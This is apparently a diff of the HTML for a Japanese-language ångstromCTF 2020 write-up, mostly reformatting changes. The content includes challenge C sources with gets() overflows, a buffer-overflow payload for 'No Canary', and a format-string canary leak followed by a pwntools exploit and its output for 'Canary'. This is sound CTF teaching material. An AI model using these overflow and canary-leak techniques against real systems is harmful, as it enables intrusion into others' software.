@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.68.3 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/angstromctf_2020/" />
@@ -46,16 +46,13 @@
 <meta property="article:modified_time" content="2020-03-20T09:00:00+09:00" />
 <meta itemprop="name" content="ångstromCTF 2020 Writeup">
 <meta itemprop="description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな">
-
-
 <meta itemprop="datePublished" content="2020-03-19T10:00:00&#43;09:00" />
 <meta itemprop="dateModified" content="2020-03-20T09:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="3301">
+<meta itemprop="wordCount" content="3303">
 
 
 
-<meta itemprop="keywords" content="CTF,Reviewed," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ångstromCTF 2020 Writeup"/>
 <meta name="twitter:description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな"/>
 
@@ -139,116 +136,99 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#misc-shifter-160-points">[Misc]: Shifter (160 points)</a>
-<ul>
-<li><a href="#challenge">Challenge</a></li>
-<li><a href="#solution">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-no-canary-50-points">[Pwn]: No Canary (50 points)</a>
-<ul>
-<li><a href="#challenge-1">Challenge</a></li>
-<li><a href="#solution-1">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-canary-70-points">[Pwn]: Canary (70 points)</a>
-<ul>
-<li><a href="#challenge-2">Challenge</a></li>
-<li><a href="#solution-2">Solution</a></li>
-</ul></li>
-<li><a href="#reverse-taking-off-70-points">[Reverse]: Taking Off (70 points)</a>
-<ul>
-<li><a href="#challenge-3">Challenge</a></li>
-<li><a href="#solution-3">Solution</a></li>
-</ul></li>
-<li><a href="#reverse-windows-of-opportunity-100-points">[Reverse]: Windows of Opportunity (100 points)</a>
-<ul>
-<li><a href="#challenge-4">Challenge</a></li>
-<li><a href="#solution-4">Solution</a></li>
-</ul></li>
-<li><a href="#misc-psk-90-points">[Misc]: PSK (90 points)</a>
-<ul>
-<li><a href="#challenge-5">Challenge</a></li>
-<li><a href="#unsolved">(Unsolved)</a></li>
-</ul></li>
-<li><a href="#misc-inputter-100-points">[Misc]: Inputter (100 points)</a>
-<ul>
-<li><a href="#challenge-6">Challenge</a></li>
-<li><a href="#unsolved-1">(Unsolved)</a></li>
-</ul></li>
-<li><a href="#misc-all-these-rules-points">[Misc]: All These Rules (?? points)</a>
-<ul>
-<li><a href="#challenge-7">Challenge</a></li>
-<li><a href="#unsolved-2">(Unsolved)</a></li>
-</ul></li>
-<li><a href="#misc-ws3-180-points">[Misc]: WS3 (180 points)</a>
-<ul>
-<li><a href="#challenge-8">Challenge</a></li>
-<li><a href="#solution-5">Solution</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#misc-shifter-160-points">[Misc]: Shifter (160 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-no-canary-50-points">[Pwn]: No Canary (50 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-canary-70-points">[Pwn]: Canary (70 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-taking-off-70-points">[Reverse]: Taking Off (70 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-windows-of-opportunity-100-points">[Reverse]: Windows of Opportunity (100 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-psk-90-points">[Misc]: PSK (90 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#unsolved">(Unsolved)</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-inputter-100-points">[Misc]: Inputter (100 points)</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#unsolved-1">(Unsolved)</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-all-these-rules--points">[Misc]: All These Rules (?? points)</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#unsolved-2">(Unsolved)</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-ws3-180-points">[Misc]: WS3 (180 points)</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<div class='align-right'>
-  
+      <div class='align-right'>
 <a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2020%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
-
 </div>
-
 <p>(2020/03/20 - 復習しました)</p>
-
-<p>URL: <a href="https://2020.angstromctf.com/challenges" target="_blank">https://2020.angstromctf.com/challenges</a>
+<p>URL: <a href="https://2020.angstromctf.com/challenges">https://2020.angstromctf.com/challenges</a>
 <br /><br /></p>
-
 <p>5日間のCTFでした。主に、初日の土曜日に頑張りました。</p>
-
 <p>高校生によって作られたCTFのようですね。素晴らしいです。</p>
-
 <p>ちなみに、過去のチャレンジ（2018年~）もアクセスできるみたいです。暇なときにやろうかと思います。</p>
-
-<p>URL: <a href="https://2019.angstromctf.com/challenges" target="_blank">https://2019.angstromctf.com/challenges</a> <br>
-URL: <a href="https://2018.angstromctf.com/challenges" target="_blank">https://2018.angstromctf.com/challenges</a></p>
-
-<p><br>
-最終順位は491位でした。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_score.png" alt="angstromctf_score.png"></p>
-
-<p><br>
-以下は解いたチャレンジです。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_solves.png" alt="angstromctf_solves.png"></p>
-
+<p>URL: <a href="https://2019.angstromctf.com/challenges">https://2019.angstromctf.com/challenges</a> <br>
+URL: <a href="https://2018.angstromctf.com/challenges">https://2018.angstromctf.com/challenges</a></p>
+<br>
+最終順位は491位でした。
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_score.png" alt="angstromctf_score.png">
+<br>
+以下は解いたチャレンジです。
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_solves.png" alt="angstromctf_solves.png">
 <p><br /><br /></p>
-
 <h2 id="misc-shifter-160-points">[Misc]: Shifter (160 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge">Challenge</h3>
-
 <blockquote>
-<p>What a strange challenge...
+<p>What a strange challenge&hellip;
 <br /><br />
-It'll be no problem for you, of course!
+It&rsquo;ll be no problem for you, of course!
 <br /><br />
 nc misc.2020.chall.actf.co 20300</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution">Solution</h3>
-
 <p>アクセスすると、以下のような出力が得られます。</p>
-
 <pre>
 $ nc misc.2020.chall.actf.co 20300
 Solve 50 of these epic problems in a row to prove you are a master crypto man like Aplet123!
@@ -261,14 +241,12 @@ Shift DYUWIYBIWFSRKVBNQFLNEUTRRPUTTVAYMNGDVCUQJIRUGJAX by n=40
 : l.}.q.jq.n{zs~jvyntvm}|zzx}||~i.uvol~k}yrqz}ori.
 Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVRKJSVHKBY. Better luck next time!
 </pre>
-
-<p><br>
-思いっきり答えを間違えると、ちゃんと正解を教えてもらえます^^</p>
-
+<br>
+思いっきり答えを間違えると、ちゃんと正解を教えてもらえます^^
 <p>以下が書いたコードです。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -308,6 +286,7 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
 </span><span class="lnt">38
 </span><span class="lnt">39
 </span><span class="lnt">40
+</span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
@@ -349,36 +328,29 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
     <span class="k">elif</span> <span class="s2">&#34;actf{&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
         <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
         <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-        <span class="k">break</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>書いたと言っても、フィボナッチのコードは昔どこかのCTFでやったのが残っていたのと、rot関数はいつも使っているやつの使い回しなので、新規に書いた部分はちょっとだけです。</p>
+        <span class="k">break</span>
 
+</code></pre></td></tr></table>
+</div>
+</div><p>書いたと言っても、フィボナッチのコードは昔どこかのCTFでやったのが残っていたのと、rot関数はいつも使っているやつの使い回しなので、新規に書いた部分はちょっとだけです。</p>
 <p><br />
 Flag: <code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="pwn-no-canary-50-points">[Pwn]: No Canary (50 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-1">Challenge</h3>
-
 <blockquote>
 <p>Agriculture is the most healthful, most useful and most noble employment of man.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>no_canary (ELF 64bit)</li>
-
-<li><p>no_canary.c</p>
+<li>no_canary.c</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -447,28 +419,25 @@ Flag: <code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
 	<span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
 
 	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div></li>
-</ul>
-
-<p><br /></p>
-
+</div><p><br /></p>
 <h3 id="solution-1">Solution</h3>
-
 <p>なんかもう、オフセットサイズとかちゃんと調べず、適当に8バイトずつ値を何回か変えて試しました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">gef➤  x flag
-0x401186 &lt;flag&gt;:	0xe5894855</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  x flag
+0x401186 &lt;flag&gt;:	0xe5894855
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -488,9 +457,9 @@ Flag: <code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
 </span><span class="lnt">18
 </span><span class="lnt">19
 </span><span class="lnt">20
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">xxxxx@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">xxxxx@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
 Ahhhh, what a beautiful morning on the farm!
 
        _.-^-._    .--.
@@ -509,21 +478,16 @@ Well, sorry if I kept you waiting.
 What&#39;s your name? 
 Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@!
 actf{that_gosh_darn_canary_got_me_pwned!}
-Segmentation fault</pre></td></tr></table>
+Segmentation fault
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 Flag: <code>actf{that_gosh_darn_canary_got_me_pwned!}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="pwn-canary-70-points">[Pwn]: Canary (70 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-2">Challenge</h3>
-
 <blockquote>
 <p>A tear rolled down her face like a tractor. “David,” she said tearfully, “I don’t want to be a farmer no more.”
 <br /><br />
@@ -531,18 +495,16 @@ Flag: <code>actf{that_gosh_darn_canary_got_me_pwned!}</code></p>
 <br /><br />
 Can you call the flag function in this program (source)? Try it out on the shell server at /problems/2020/canary or by connecting with nc shell.actf.co 20701.
 <br /><br />
-Hint: That printf call looks dangerous too...</p>
+Hint: That printf call looks dangerous too&hellip;</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>canary (ELF 64bit)</li>
-
-<li><p>canary.c</p>
+<li>canary.c</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -651,17 +613,12 @@ Hint: That printf call looks dangerous too...</p>
 	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
 	<span class="n">wake</span><span class="p">();</span>
 	<span class="n">greet</span><span class="p">();</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div></li>
-</ul>
-
-<p><br /></p>
-
+</div><p><br /></p>
 <h3 id="solution-2">Solution</h3>
-
 <p>FSB (Format String Bug)を使ってCanaryをLeakし、Canaryを壊さないようにしてBOFをするチャレンジです。</p>
-
 <pre>
 captureamerica@kali:~/CTF/angstromCTF_2020$ checksec canary
 [*] '/home/captureamerica/CTF/angstromCTF_2020/canary'
@@ -671,43 +628,33 @@ captureamerica@kali:~/CTF/angstromCTF_2020$ checksec canary
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 </pre>
-
 <p><br />
 オフセットのサイズ(56バイト)と、Canaryが現れる位置(17)は、gdbで調べました。</p>
-
 <p>以下のスクリーンショットは、最初の入力でAAAA、2回目の入力でBBBBを入れた後に見たスタックです。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_canary_gdb.png" alt="angstromctf_canary_gdb.png"></p>
-
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_canary_gdb.png" alt="angstromctf_canary_gdb.png">
 <p>Return Address (0x4009c9)の2つ前がCanaryです。Null(\00)で始まってます。</p>
-
 <p>バッファオーバーフローをさせるのは2回目の入力なので、BBBBの位置から見て56バイトがCanaryまでのオフセットです。</p>
-
-<p><br>
-FSBをした際に何番目になるかは、以下の方法で調べました。0x4009c9を目安に探します。実行する度に値は変わります。</p>
-
+<br>
+FSBをした際に何番目になるかは、以下の方法で調べました。0x4009c9を目安に探します。実行する度に値は変わります。
 <pre>
 Hi! What's your name? %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 Nice to meet you, 0x7fffffffb820 0x47 0xffffffffffffffb7 0x7ffff7fb5500 0x12 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2170252070252070 0x7fffffff000a (nil) 0xddff4ae3ed3ade00 0x7fffffffdf30 0x4009c9 0x7fffffffe010 0x3e900000000 0x4009d0 0x7ffff7e1abbb (nil)!
 </pre>
-
 <pre>
 Hi! What's your name? %17$p
 Nice to meet you, 0xe1cad64c2bec5d00!
 </pre>
-
-<p><br>
+<br>
 flag()関数のアドレス。
 <pre>
 gef➤  x flag
-0x400787 <flag>:    0xe5894855
-</pre></p>
-
+0x400787 <flag>:	0xe5894855
+</pre>
 <p><br />
 以下が今回書いたコードです。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -766,12 +713,11 @@ gef➤  x flag
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 実行結果：</p>
-
 <pre>
 captureamerica@kali:~/CTF/angstromCTF_2020$ ./canary_solve.py 
 [+] Connecting to shell.actf.co on port 22: Done
@@ -788,148 +734,107 @@ captureamerica@kali:~/CTF/angstromCTF_2020$ ./canary_solve.py
 [*] Stopped remote process 'canary' on shell.actf.co (pid 4605)
 actf{youre_a_canary_killer_>:(}
 </pre>
-
-<p><br>
-Flag: <code>actf{youre_a_canary_killer_&gt;:(}</code></p>
-
+<br>
+Flag: `actf{youre_a_canary_killer_>:(}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="reverse-taking-off-70-points">[Reverse]: Taking Off (70 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-3">Challenge</h3>
-
 <blockquote>
 <p>So you started revving up, but is it enough to take off? Find the problem in /problems/2020/taking_off/ in the shell server.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>taking_off (ELF 64bit)</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-3">Solution</h3>
-
 <p>簡単なやつだったんで、概要だけ。</p>
-
 <p>Ghidraでソースを確認すると、引数が4つ必要で、最初の3つは整数、最後の1個は文字列なのがわかります。</p>
-
 <p>整数は、計算して932になるもの、文字列は&quot;chicken&quot;です。</p>
-
-<p>その後、パスワードが聞かれます。&quot;please give flag&quot;です。（XOR 0x2aされてます）。</p>
+<p>その後、パスワードが聞かれます。&ldquo;please give flag&quot;です。（XOR 0x2aされてます）。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">xxxxx@actf:/problems/2020/taking_off$ ./taking_off 3 9 2 chicken
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">xxxxx@actf:/problems/2020/taking_off$ ./taking_off 3 9 2 chicken
 So you figured out how to provide input and command line arguments.
 But can you figure out what input to provide?
 Well, you found the arguments, but what&#39;s the password?
 please give flag
 Good job! You&#39;re ready to move on to bigger and badder rev!
-actf{th3y_gr0w_up_s0_f4st}</pre></td></tr></table>
+actf{th3y_gr0w_up_s0_f4st}
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 Flag: <code>actf{th3y_gr0w_up_s0_f4st}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="reverse-windows-of-opportunity-100-points">[Reverse]: Windows of Opportunity (100 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-4">Challenge</h3>
-
 <blockquote>
-<p>Clam's a windows elitist and he just can't stand seeing all of these linux challenges! So, he decided to step in and create his own rev challenge with the &quot;superior&quot; operating system.
+<p>Clam&rsquo;s a windows elitist and he just can&rsquo;t stand seeing all of these linux challenges! So, he decided to step in and create his own rev challenge with the &ldquo;superior&rdquo; operating system.
 <br><br>
-Alternatively, find it at /problems/2020/windows_lives_matter/ on the shell server (even though you won't actually be able to run it from the shell server).</p>
+Alternatively, find it at /problems/2020/windows_lives_matter/ on the shell server (even though you won&rsquo;t actually be able to run it from the shell server).</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>windows_of_opportunity.exe</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-4">Solution</h3>
-
 <p>やけに正解者が多いなと思ったら、案の定stringsで解けるやつでした。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">captureamerica@kali:~/Downloads$ strings windows_of_opportunity.exe | grep -i ctf
-actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">captureamerica@kali:~/Downloads$ strings windows_of_opportunity.exe | grep -i ctf
+actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 100点問題だし、たぶん想定解じゃないんだろうな。一生懸命作ったのに、かわいそう。</p>
-
 <p><br />
 Flag: <code>actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}</code></p>
-
 <p><br /><br />
 <br /><br />
 ここから下のやつは、解けなくて諦めたやつです。</p>
-
 <h2 id="misc-psk-90-points">[Misc]: PSK (90 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-5">Challenge</h3>
-
 <blockquote>
-<p>My friend sent my yet another mysterious recording...
+<p>My friend sent my yet another mysterious recording&hellip;
 <br><br>
-He told me he was inspired by PicoCTF 2019 and made his own transmissions. I've looked at it, and it seems to be really compact and efficient.
+He told me he was inspired by PicoCTF 2019 and made his own transmissions. I&rsquo;ve looked at it, and it seems to be really compact and efficient.
 <br><br>
 Only 31 bps!!
 <br><br>
-See if you can decode what he sent to me. It's in actf{} format</p>
+See if you can decode what he sent to me. It&rsquo;s in actf{} format</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>transmission.wav</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="unsolved">(Unsolved)</h3>
-
 <p>はい、PicoCTF 2019でSSTVの問題ありましたね。今回のこれは、PSK31ってやつみたいです。</p>
-
 <p>いくつかツールを試したんですが、いいのが見つからなくて、諦めました。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-inputter-100-points">[Misc]: Inputter (100 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-6">Challenge</h3>
-
 <blockquote>
 <p>Clam really likes challenging himself. When he learned about all these weird unprintable ASCII characters he just HAD to put it in a challenge. Can you satisfy his knack for strange and hard-to-input characters? Source.
 <br><br>
@@ -937,16 +842,14 @@ Find it on the shell server at /problems/2020/inputter/.
 <br><br>
 Hint: There are ways to run programs without using the shell.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>inputter (ELF 64bit)</li>
-
-<li><p>inputter.c</p>
+<li>inputter.c</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1001,54 +904,48 @@ Hint: There are ways to run programs without using the shell.</p>
 <span class="cp">#define FLAGSIZE 128
 </span><span class="cp"></span>
 <span class="kt">void</span> <span class="nf">print_flag</span><span class="p">()</span> <span class="p">{</span>
-<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-<span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
-<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
-<span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot read flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">FLAGSIZE</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
-<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+    <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot read flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">FLAGSIZE</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument count isn&#39;t right.&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your argument count isn&#39;t right.&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
